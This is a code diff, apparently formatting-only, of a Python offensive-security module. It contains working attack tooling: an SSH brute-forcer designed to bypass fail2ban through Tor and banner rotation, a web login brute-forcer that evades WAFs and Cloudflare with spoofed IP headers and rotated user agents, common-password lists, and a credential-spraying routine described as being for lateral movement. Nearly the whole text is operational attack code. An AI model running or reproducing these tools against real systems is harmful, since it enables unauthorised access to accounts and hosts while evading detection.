@@ -34,6 +34,7 @@ from core.version import APPLICATION_VERSION
 
 try:
     import paramiko
+
     _PARAMIKO_OK = True
 except ImportError:
     paramiko = None
@@ -42,6 +43,7 @@ except ImportError:
 try:
     import requests as _requests
     from requests.adapters import HTTPAdapter
+
     _REQUESTS_OK = True
 except ImportError:
     _requests = None
@@ -49,6 +51,7 @@ except ImportError:
 
 try:
     import socks  # PySocks
+
     _SOCKS_OK = True
 except ImportError:
     socks = None
@@ -60,14 +63,14 @@ except ImportError:
     CFG = {}
 
 # ANSI Colors
-C_GREEN  = "\033[92m"
+C_GREEN = "\033[92m"
 C_YELLOW = "\033[93m"
-C_RED    = "\033[91m"
-C_CYAN   = "\033[96m"
-C_GREY   = "\033[90m"
-C_BLUE   = "\033[94m"
+C_RED = "\033[91m"
+C_CYAN = "\033[96m"
+C_GREY = "\033[90m"
+C_BLUE = "\033[94m"
 C_MAGENTA = "\033[95m"
-C_RESET  = "\033[0m"
+C_RESET = "\033[0m"
 
 # USER-AGENT ROTATION POOL (real browser strings)
 
@@ -100,6 +103,7 @@ _SSH_BANNERS = [
 
 
 # PROXY / TOR MANAGEMENT
+
 
 def _check_tor_running() -> bool:
     """Check if TOR SOCKS proxy is available on port 9050."""
@@ -153,12 +157,21 @@ def _create_proxy_socket(host, port, proxy_type="socks5", proxy_host="127.0.0.1"
 
 # SSH BRUTEFORCE — PARAMIKO-BASED (fail2ban bypass)
 
-def ssh_bruteforce_stealth(target: str, port: int = 22, users: Optional[list] = None,
-                           passwords: Optional[list] = None, password_files: Optional[list] = None,
-                           use_tor: bool = False, max_attempts_per_conn: int = 3,
-                           base_delay: float = 2.0, jitter: float = 1.5,
-                           ban_wait: int = 300, max_ban_retries: int = 10,
-                           max_passwords: int = 5000) -> str:
+
+def ssh_bruteforce_stealth(
+    target: str,
+    port: int = 22,
+    users: Optional[list] = None,
+    passwords: Optional[list] = None,
+    password_files: Optional[list] = None,
+    use_tor: bool = False,
+    max_attempts_per_conn: int = 3,
+    base_delay: float = 2.0,
+    jitter: float = 1.5,
+    ban_wait: int = 300,
+    max_ban_retries: int = 10,
+    max_passwords: int = 5000,
+) -> str:
     """
     Stealth SSH bruteforce using paramiko Transport reuse.
 
@@ -217,10 +230,10 @@ def ssh_bruteforce_stealth(target: str, port: int = 22, users: Optional[list] = 
                 with open(fpath, errors="ignore") as f:
                     for line in f:
                         word = line.strip()
-                        if not word or word.startswith('#'):
+                        if not word or word.startswith("#"):
                             continue
-                        if ':' in word and not word.startswith('$'):
-                            parts = word.split(':', 1)
+                        if ":" in word and not word.startswith("$"):
+                            parts = word.split(":", 1)
                             if len(parts) == 2 and len(parts[1]) < 64:
                                 word = parts[1]
                         if word and word not in seen:
@@ -233,15 +246,40 @@ def ssh_bruteforce_stealth(target: str, port: int = 22, users: Optional[list] = 
             if len(pwd_list) >= max_passwords:
                 break
         if len(pwd_list) >= max_passwords:
-            print(f"  {C_YELLOW}[!] Password list capped at {max_passwords:,} (from {len(password_files)} files){C_RESET}")
+            print(
+                f"  {C_YELLOW}[!] Password list capped at {max_passwords:,} (from {len(password_files)} files){C_RESET}"
+            )
     else:
         # Default small list
         pwd_list = [
-            "root", "toor", "admin", "password", "123456", "12345678",
-            "1234", "support", "test", "guest", "changeme", "letmein",
-            "welcome", "monkey", "dragon", "master", "qwerty", "login",
-            "abc123", "passw0rd", "pass123", "administrator", "P@ssw0rd",
-            "p@$$w0rd", "root123", "admin123", "default", "1q2w3e4r",
+            "root",
+            "toor",
+            "admin",
+            "password",
+            "123456",
+            "12345678",
+            "1234",
+            "support",
+            "test",
+            "guest",
+            "changeme",
+            "letmein",
+            "welcome",
+            "monkey",
+            "dragon",
+            "master",
+            "qwerty",
+            "login",
+            "abc123",
+            "passw0rd",
+            "pass123",
+            "administrator",
+            "P@ssw0rd",
+            "p@$$w0rd",
+            "root123",
+            "admin123",
+            "default",
+            "1q2w3e4r",
         ]
 
     total_combos = len(pwd_list) * len(users)
@@ -321,9 +359,11 @@ def ssh_bruteforce_stealth(target: str, port: int = 22, users: Optional[list] = 
                 elapsed = int(time.time() - start_time)
                 rate = attempt_num / max(elapsed, 1)
                 if attempt_num % 5 == 0 or attempt_num <= 3:
-                    print(f"  {C_GREY}[{elapsed}s] #{attempt_num}/{total_combos} "
-                          f"({rate:.1f}/s) {user}:{pwd[:20]}{'...' if len(pwd) > 20 else ''} "
-                          f"[conn#{connections_made}]{C_RESET}")
+                    print(
+                        f"  {C_GREY}[{elapsed}s] #{attempt_num}/{total_combos} "
+                        f"({rate:.1f}/s) {user}:{pwd[:20]}{'...' if len(pwd) > 20 else ''} "
+                        f"[conn#{connections_made}]{C_RESET}"
+                    )
 
                 try:
                     transport.auth_password(user, pwd)
@@ -340,8 +380,7 @@ def ssh_bruteforce_stealth(target: str, port: int = 22, users: Optional[list] = 
                     # Keep searching for more creds? Only if small list
                     if total_combos > 100:
                         transport.close()
-                        output += _format_brute_summary(found_creds, attempt_num, connections_made,
-                                                       elapsed, ban_count)
+                        output += _format_brute_summary(found_creds, attempt_num, connections_made, elapsed, ban_count)
                         return output
                     # For small lists, continue to find all valid creds
 
@@ -397,10 +436,14 @@ def ssh_bruteforce_stealth(target: str, port: int = 22, users: Optional[list] = 
                 actual_wait = ban_wait + (consecutive_bans - 1) * 60
                 actual_wait = min(actual_wait, 600)  # cap at 10 min
 
-            print(f"\n  {C_YELLOW}[BAN #{ban_count}] Connection refused at attempt #{attempt_num} "
-                  f"(conn#{connections_made}){C_RESET}")
-            print(f"  {C_YELLOW}[*] Waiting {actual_wait}s for ban expiry "
-                  f"(progress: {idx}/{total_combos}, elapsed: {_fmt_time(elapsed)}){C_RESET}")
+            print(
+                f"\n  {C_YELLOW}[BAN #{ban_count}] Connection refused at attempt #{attempt_num} "
+                f"(conn#{connections_made}){C_RESET}"
+            )
+            print(
+                f"  {C_YELLOW}[*] Waiting {actual_wait}s for ban expiry "
+                f"(progress: {idx}/{total_combos}, elapsed: {_fmt_time(elapsed)}){C_RESET}"
+            )
 
             # Show countdown — use TOR socket for port check if TOR is available
             for remaining in range(actual_wait, 0, -30):
@@ -488,6 +531,7 @@ def _fmt_time(secs: int) -> str:
 
 # WEB EVASION ENGINE
 
+
 class WebEvasionSession:
     """
     HTTP session with built-in evasion for WAF, Cloudflare, nginx rate-limit.
@@ -503,8 +547,7 @@ class WebEvasionSession:
     - Referer chain building
     """
 
-    def __init__(self, use_tor: bool = False, delay: float = 1.0,
-                 jitter: float = 0.5, rotate_ua: bool = True):
+    def __init__(self, use_tor: bool = False, delay: float = 1.0, jitter: float = 0.5, rotate_ua: bool = True):
         if not _REQUESTS_OK:
             raise ImportError("requests not installed")
 
@@ -534,19 +577,22 @@ class WebEvasionSession:
 
         # Disable SSL warnings
         import urllib3
+
         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
     def _get_headers(self, url: str = "", extra_headers: Optional[dict] = None) -> dict:
         """Generate evasive request headers."""
         headers = {
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-            "Accept-Language": random.choice([
-                "en-US,en;q=0.5",
-                "en-GB,en;q=0.9",
-                "de-DE,de;q=0.9,en;q=0.5",
-                "fr-FR,fr;q=0.9,en;q=0.5",
-                "ru-RU,ru;q=0.9,en;q=0.5",
-            ]),
+            "Accept-Language": random.choice(
+                [
+                    "en-US,en;q=0.5",
+                    "en-GB,en;q=0.9",
+                    "de-DE,de;q=0.9,en;q=0.5",
+                    "fr-FR,fr;q=0.9,en;q=0.5",
+                    "ru-RU,ru;q=0.9,en;q=0.5",
+                ]
+            ),
             "Accept-Encoding": "gzip, deflate, br",
             "Connection": "keep-alive",
             "Upgrade-Insecure-Requests": "1",
@@ -564,7 +610,7 @@ class WebEvasionSession:
             headers["User-Agent"] = _USER_AGENTS[0]
 
         # X-Forwarded-For spoofing (bypass IP-based rate limiting)
-        fake_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+        fake_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
         headers["X-Forwarded-For"] = fake_ip
         headers["X-Real-IP"] = fake_ip
         headers["X-Originating-IP"] = fake_ip
@@ -575,12 +621,14 @@ class WebEvasionSession:
         # Referer chain
         if url:
             domain = url.split("//")[-1].split("/")[0]
-            headers["Referer"] = random.choice([
-                f"https://www.google.com/search?q={domain}",
-                f"https://{domain}/",
-                f"https://www.bing.com/search?q={domain}",
-                "",
-            ])
+            headers["Referer"] = random.choice(
+                [
+                    f"https://www.google.com/search?q={domain}",
+                    f"https://{domain}/",
+                    f"https://www.bing.com/search?q={domain}",
+                    "",
+                ]
+            )
 
         if extra_headers:
             headers.update(extra_headers)
@@ -597,7 +645,7 @@ class WebEvasionSession:
             time.sleep(desired_delay - elapsed)
         self._last_request_time = time.time()
 
-    def get(self, url: str, **kwargs) -> '_requests.Response':
+    def get(self, url: str, **kwargs) -> "_requests.Response":
         """Evasive GET request."""
         self._throttle()
         self.request_count += 1
@@ -623,14 +671,13 @@ class WebEvasionSession:
 
         return resp
 
-    def post(self, url: str, **kwargs) -> '_requests.Response':
+    def post(self, url: str, **kwargs) -> "_requests.Response":
         """Evasive POST request."""
         self._throttle()
         self.request_count += 1
 
         headers = self._get_headers(url, kwargs.pop("headers", None))
-        headers["Content-Type"] = kwargs.pop("content_type",
-                                             "application/x-www-form-urlencoded")
+        headers["Content-Type"] = kwargs.pop("content_type", "application/x-www-form-urlencoded")
         kwargs.setdefault("verify", False)
         kwargs.setdefault("timeout", (5, 15))
 
@@ -653,9 +700,7 @@ class WebEvasionSession:
         cf_headers = ["cf-ray", "cf-cache-status", "cf-request-id"]
         if resp.status_code == 403 and any(h in resp.headers for h in cf_headers):
             return True
-        if resp.status_code == 503 and (
-            "cloudflare" in resp.text.lower() or "cf-" in str(resp.headers).lower()
-        ):
+        if resp.status_code == 503 and ("cloudflare" in resp.text.lower() or "cf-" in str(resp.headers).lower()):
             return True
         if "checking your browser" in resp.text.lower():
             return True
@@ -707,7 +752,8 @@ class WebEvasionSession:
                     if tresp.status_code in [403, 406, 429, 503]:
                         result["waf_detected"] = True
                         result["details"].append(
-                            f"Blocked payload (HTTP {tresp.status_code}): {payload.split('?')[1][:50]}")
+                            f"Blocked payload (HTTP {tresp.status_code}): {payload.split('?')[1][:50]}"
+                        )
                 except Exception as _exc:
                     logging.debug(f"Suppressed in evasion.py: {_exc}")
 
@@ -719,9 +765,15 @@ class WebEvasionSession:
 
 # WEB LOGIN BRUTEFORCE WITH EVASION
 
-def web_bruteforce_stealth(url: str, users: Optional[list] = None, passwords: Optional[list] = None,
-                           password_files: Optional[list] = None, use_tor: bool = False,
-                           form_data: Optional[dict] = None) -> str:
+
+def web_bruteforce_stealth(
+    url: str,
+    users: Optional[list] = None,
+    passwords: Optional[list] = None,
+    password_files: Optional[list] = None,
+    use_tor: bool = False,
+    form_data: Optional[dict] = None,
+) -> str:
     """
     Stealth web login bruteforce with WAF/rate-limit evasion.
 
@@ -739,8 +791,18 @@ def web_bruteforce_stealth(url: str, users: Optional[list] = None, passwords: Op
     if not users:
         users = ["admin", "root", "administrator", "user", "test"]
     if not passwords and not password_files:
-        passwords = ["admin", "password", "123456", "admin123", "root",
-                     "toor", "test", "changeme", "letmein", "welcome"]
+        passwords = [
+            "admin",
+            "password",
+            "123456",
+            "admin123",
+            "root",
+            "toor",
+            "test",
+            "changeme",
+            "letmein",
+            "welcome",
+        ]
 
     # Load passwords from files
     if password_files and not passwords:
@@ -751,7 +813,7 @@ def web_bruteforce_stealth(url: str, users: Optional[list] = None, passwords: Op
                 with open(fpath, errors="ignore") as f:
                     for line in f:
                         word = line.strip()
-                        if word and word not in seen and not word.startswith('#'):
+                        if word and word not in seen and not word.startswith("#"):
                             seen.add(word)
                             passwords.append(word)
                             if len(passwords) >= 5000:
@@ -764,6 +826,7 @@ def web_bruteforce_stealth(url: str, users: Optional[list] = None, passwords: Op
     try:
         resp = session.get(url)
         from bs4 import BeautifulSoup
+
         soup = BeautifulSoup(resp.text, "html.parser")
 
         # Find login form
@@ -785,6 +848,7 @@ def web_bruteforce_stealth(url: str, users: Optional[list] = None, passwords: Op
             method = login_form.get("method", "POST").upper()
             if action and not action.startswith("http"):
                 from urllib.parse import urljoin
+
                 action = urljoin(url, action)
             elif not action:
                 action = url
@@ -801,7 +865,12 @@ def web_bruteforce_stealth(url: str, users: Optional[list] = None, passwords: Op
                     continue
                 if itype == "password" or "pass" in name.lower() or "pwd" in name.lower():
                     pass_field = name
-                elif itype in ("text", "email") or "user" in name.lower() or "login" in name.lower() or "email" in name.lower():
+                elif (
+                    itype in ("text", "email")
+                    or "user" in name.lower()
+                    or "login" in name.lower()
+                    or "email" in name.lower()
+                ):
                     user_field = name
                 elif itype == "hidden":
                     form_data[name] = value  # CSRF tokens, etc.
@@ -858,16 +927,35 @@ def web_bruteforce_stealth(url: str, users: Optional[list] = None, passwords: Op
                 # Detect success
                 resp_lower = resp.text.lower()
                 is_success = (
-                    resp.status_code in [200, 302, 303] and
-                    not any(fail in resp_lower for fail in [
-                        "invalid", "incorrect", "wrong", "failed", "error",
-                        "denied", "unauthorized", "bad credentials",
-                    ]) and
-                    (resp.status_code in [302, 303] or
-                     any(ok in resp_lower for ok in [
-                         "dashboard", "welcome", "logout", "profile",
-                         "settings", "my account", "admin panel",
-                     ]))
+                    resp.status_code in [200, 302, 303]
+                    and not any(
+                        fail in resp_lower
+                        for fail in [
+                            "invalid",
+                            "incorrect",
+                            "wrong",
+                            "failed",
+                            "error",
+                            "denied",
+                            "unauthorized",
+                            "bad credentials",
+                        ]
+                    )
+                    and (
+                        resp.status_code in [302, 303]
+                        or any(
+                            ok in resp_lower
+                            for ok in [
+                                "dashboard",
+                                "welcome",
+                                "logout",
+                                "profile",
+                                "settings",
+                                "my account",
+                                "admin panel",
+                            ]
+                        )
+                    )
                 )
 
                 if is_success:
@@ -892,9 +980,15 @@ def web_bruteforce_stealth(url: str, users: Optional[list] = None, passwords: Op
 
 # PORT-AGNOSTIC SERVICE BRUTEFORCE
 
-def service_bruteforce_stealth(service: str, target: str, port: Optional[int] = None,
-                               users: Optional[list] = None, password_files: Optional[list] = None,
-                               use_tor: bool = False) -> str:
+
+def service_bruteforce_stealth(
+    service: str,
+    target: str,
+    port: Optional[int] = None,
+    users: Optional[list] = None,
+    password_files: Optional[list] = None,
+    use_tor: bool = False,
+) -> str:
     """
     Universal service bruteforce dispatcher.
     Routes to the right stealth brute engine based on service type.
@@ -902,20 +996,24 @@ def service_bruteforce_stealth(service: str, target: str, port: Optional[int] = 
     if service in ("ssh", "sftp"):
         port = port or 22
         return ssh_bruteforce_stealth(
-            target, port=port, users=users, password_files=password_files,
-            use_tor=use_tor, max_attempts_per_conn=3,
-            base_delay=2.5, jitter=1.5, ban_wait=300
+            target,
+            port=port,
+            users=users,
+            password_files=password_files,
+            use_tor=use_tor,
+            max_attempts_per_conn=3,
+            base_delay=2.5,
+            jitter=1.5,
+            ban_wait=300,
         )
 
     elif service in ("http-post-form", "http-post", "web", "http"):
         url = f"http://{target}:{port}" if port and port != 80 else f"http://{target}"
-        return web_bruteforce_stealth(url, users=users, password_files=password_files,
-                                     use_tor=use_tor)
+        return web_bruteforce_stealth(url, users=users, password_files=password_files, use_tor=use_tor)
 
     elif service in ("https-post-form", "https"):
         url = f"https://{target}:{port}" if port and port != 443 else f"https://{target}"
-        return web_bruteforce_stealth(url, users=users, password_files=password_files,
-                                     use_tor=use_tor)
+        return web_bruteforce_stealth(url, users=users, password_files=password_files, use_tor=use_tor)
 
     else:
         # For FTP, MySQL, etc. — fall back to hydra (less targeted by fail2ban)
@@ -927,13 +1025,13 @@ def credential_spray(targets: list, creds: list, service: str = "ssh", delay: fl
     Perform credential spraying for lateral movement.
     Tries each credential against ALL targets before moving to the next credential.
     This prevents locking out accounts by spacing out attempts on the same host.
-    
+
     Args:
         targets: List of IPs/hosts to spray.
         creds: List of (username, password) tuples.
         service: Protocol to spray (currently supports 'ssh').
         delay: Sleep time between attempts to avoid detection.
-        
+
     Returns:
         List of successful login dicts: [{'target': ip, 'user': u, 'password': p}]
     """
@@ -959,7 +1057,7 @@ def credential_spray(targets: list, creds: list, service: str = "ssh", delay: fl
 
         for target in spray_targets:
             # Skip targets we already compromised
-            if any(s['target'] == target for s in successful_logins):
+            if any(s["target"] == target for s in successful_logins):
                 continue
 
             try:
@@ -968,18 +1066,13 @@ def credential_spray(targets: list, creds: list, service: str = "ssh", delay: fl
                     transport.connect()
 
                     # Randomize SSH banner
-                    if hasattr(transport, 'local_version'):
+                    if hasattr(transport, "local_version"):
                         transport.local_version = random.choice(_SSH_BANNERS)
 
                     transport.auth_password(user, pwd)
                     # If we reach here, auth succeeded
                     print(f"    {C_GREEN}[SUCCESS] {user}:{pwd} @ {target}{C_RESET}")
-                    successful_logins.append({
-                        "target": target,
-                        "service": service,
-                        "user": user,
-                        "password": pwd
-                    })
+                    successful_logins.append({"target": target, "service": service, "user": user, "password": pwd})
                     transport.close()
             except paramiko.AuthenticationException:
                 pass  # Failed auth, expected
@@ -987,7 +1080,7 @@ def credential_spray(targets: list, creds: list, service: str = "ssh", delay: fl
                 pass  # Connection refused, timeout, etc.
             finally:
                 try:
-                    if 'transport' in locals() and transport:
+                    if "transport" in locals() and transport:
                         transport.close()
                 except Exception as _exc:
                     logging.debug(f"Suppressed in evasion.py: {_exc}")
@@ -1000,7 +1093,6 @@ def credential_spray(targets: list, creds: list, service: str = "ssh", delay: fl
         time.sleep(delay * 2)
 
     return successful_logins
-
 
 
 # QUICK TEST
